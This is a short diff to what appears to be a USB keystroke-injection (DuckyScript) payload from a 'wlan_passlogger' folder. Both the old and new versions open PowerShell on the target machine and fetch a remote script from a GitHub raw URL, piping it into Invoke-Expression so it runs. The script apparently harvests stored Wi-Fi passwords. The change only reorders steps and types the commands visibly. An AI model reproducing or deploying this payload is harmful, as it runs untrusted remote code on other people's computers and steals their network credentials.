@@ -1,8 +1,16 @@
-DEFINE #SCRIPTURL https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/wlan_passlogger/option2/script.ps1
+
+GUI d
 
 GUI r
-DELAY 1000
-STRING powershell -w h Invoke-RestMethod -Uri #SCRIPTURL | Invoke-Expression
+
+STRING powershell
 ENTER
+DELAY 1000
+
+STRING $gitUrl = "https://raw.githubusercontent.com/castrosp/payloads/refs/heads/main/wlan_passlogger/option2/script.ps1"
+ENTER
+STRING Invoke-RestMethod -Uri $gitUrl | Invoke-Expression
+ENTER
+
 DELAY 5000
 STRING exit
